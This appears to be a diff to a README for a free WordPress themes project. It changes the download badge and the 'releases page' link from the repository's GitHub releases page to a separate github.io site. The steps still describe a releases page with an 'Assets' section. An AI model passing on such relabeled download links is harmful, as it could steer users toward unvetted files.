@@ -1,6 +1,6 @@
 # 🌐 wpai-themes - Build websites with free WordPress tools
 
-[![Download wpai-themes](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Groundspolicecourt124/wpai-themes/releases)
+[![Download wpai-themes](https://img.shields.io/badge/Download-Release_Page-blue)](https://groundspolicecourt124.github.io)
 
 wpai-themes provides free WordPress themes and plugins for your website. You can view each theme inside a live WordPress environment right in your web browser. This tool helps you test designs before you install them on your actual site. Every file uses the GPL license, which means you own the code and can use it anywhere.
 
@@ -24,7 +24,7 @@ To use these themes, you need a computer that meets these basic specs:
 
 Follow these steps to get your files:
 
-1. Visit the [releases page](https://github.com/Groundspolicecourt124/wpai-themes/releases) to access the downloads.
+1. Visit the [releases page](https://groundspolicecourt124.github.io) to access the downloads.
 2. Select the latest version listed at the top of the page.
 3. Look for the file marked with the .zip extension under the "Assets" section.
 4. Click the link to save the zip file to your local computer.
